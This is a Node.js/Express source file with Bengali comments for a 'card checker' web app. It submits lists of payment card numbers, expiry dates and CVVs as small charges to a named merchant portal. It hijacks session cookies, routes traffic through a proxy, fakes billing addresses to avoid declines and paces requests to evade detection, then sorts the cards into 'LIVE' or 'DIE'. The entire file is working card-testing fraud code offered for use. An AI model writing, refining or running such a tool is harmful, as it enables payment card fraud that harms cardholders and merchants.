const express = require('express');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

// প্রক্সি সেটআপ
const proxyUrl = "http://YOUR_BRIGHT_DATA_PROXY"; 
const agent = new HttpsProxyAgent(proxyUrl);

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ডাইনামিক অ্যাড্রেস লজিক (Anti-Die)
function getAddress(cardNumber) {
    const firstDigit = cardNumber.charAt(0);
    if (firstDigit === '3' || firstDigit === '5') {
        return { line1: "725 5th Ave", city: "New York", state: "NY", zip: "10022", country: "US" };
    } else {
        return { line1: "Hamdan Bin Mohammed Street", city: "Abu Dhabi", state: "Abu Dhabi", zip: "00000", country: "AE" };
    }
}

// ফ্রন্টএন্ড HTML ইন্টারফেস
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>RIAD CARD CHECKER</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <style>
            body { background: #0f172a; color: white; font-family: sans-serif; }
            .card-glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
            .live-text { color: #22c55e; }
            .die-text { color: #ef4444; }
        </style>
    </head>
    <body class="p-4 md:p-8">
        <div class="max-w-lg mx-auto card-glass p-6 rounded-3xl shadow-2xl">
            <h1 class="text-2xl font-bold text-center mb-6 text-blue-400">MeydanFZ Anti-Die Checker</h1>
            
            <div class="space-y-4">
                <div>
                    <label class="block text-sm mb-1">Merchant URL</label>
                    <input id="target" type="text" value="https://portal.meydanfz.ae" class="w-full bg-slate-800 border border-slate-700 p-3 rounded-xl outline-none focus:border-blue-500">
                </div>

                <div>
                    <label class="block text-sm mb-1">JSON Cookies</label>
                    <textarea id="cookies" placeholder='[{"name": "session", "value": "..."}]' class="w-full bg-slate-800 border border-slate-700 p-3 rounded-xl h-24 outline-none focus:border-blue-500"></textarea>
                </div>

                <div>
                    <label class="block text-sm mb-1">Card List (Number|MM|YY|CVV)</label>
                    <textarea id="cards" placeholder="4444555566667777|12|26|123" class="w-full bg-slate-800 border border-slate-700 p-3 rounded-xl h-32 outline-none focus:border-blue-500"></textarea>
                </div>

                <button onclick="startCheck()" id="btn" class="w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-xl font-bold transition-all">START CHECKING</button>
            </div>

            <div id="results" class="mt-8 space-y-2"></div>
            
            <footer class="mt-8 text-center text-xs text-slate-500 border-t border-slate-800 pt-4">
                <p class="animate-pulse">MADE BY:- MD RIAD DEWAN</p>
            </footer>
        </div>

        <script>
            async function startCheck() {
                const btn = document.getElementById('btn');
                const results = document.getElementById('results');
                const cards = document.getElementById('cards').value.split('\\n');
                
                btn.disabled = true;
                btn.innerText = "CHECKING IN PROGRESS...";
                results.innerHTML = '<p class="text-center text-blue-400">Anti-Merchant Die Mode Active... 🛡️</p>';

                for (let card of cards) {
                    if(!card.trim()) continue;
                    const res = await fetch('/check', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            card,
                            target: document.getElementById('target').value,
                            cookies: document.getElementById('cookies').value
                        })
                    });
                    const data = await res.json();
                    const div = document.createElement('div');
                    div.className = "p-3 rounded-lg text-sm " + (data.status === 'LIVE' ? 'bg-green-900/30 border border-green-700' : 'bg-red-900/30 border border-red-700');
                    div.innerHTML = \`<b>\${data.status}</b> | \${card} <br> <span class="text-xs opacity-70">\${data.msg}</span>\`;
                    results.prepend(div);
                    await new Promise(r => setTimeout(r, 10000)); // ১০ সেকেন্ড বিরতি
                }
                btn.disabled = false;
                btn.innerText = "START CHECKING";
            }
        </script>
    </body>
    </html>
    `);
});

// কার্ড চেকিং ব্যাকএন্ড
app.post('/check', async (req, res) => {
    const { card, target, cookies } = req.body;
    const [cc, mm, yy, cvv] = card.split('|').map(c => c.trim());
    const billing = getAddress(cc);

    try {
        let cookieJar = "";
        try {
            const parsed = JSON.parse(cookies);
            cookieJar = (Array.isArray(parsed) ? parsed : [parsed]).map(c => `${c.name}=${c.value}`).join('; ');
        } catch(e) { cookieJar = cookies; }

        const response = await axios.post(target, {
            card_number: cc, exp_month: mm, exp_year: yy, cvv: cvv,
            address: billing.line1, city: billing.city, state: billing.state, zip: billing.zip, country: billing.country,
            amount: "1.00", currency: "AED"
        }, {
            headers: { 'Cookie': cookieJar, 'User-Agent': 'Mozilla/5.0' },
            httpsAgent: agent,
            timeout: 25000
        });

        res.json({ status: 'LIVE', msg: 'Approved ✅' });
    } catch (error) {
        res.json({ status: 'DIE', msg: error.response?.data?.message || error.message });
    }
});

app.listen(port, () => console.log(`App running on port ${port}`));
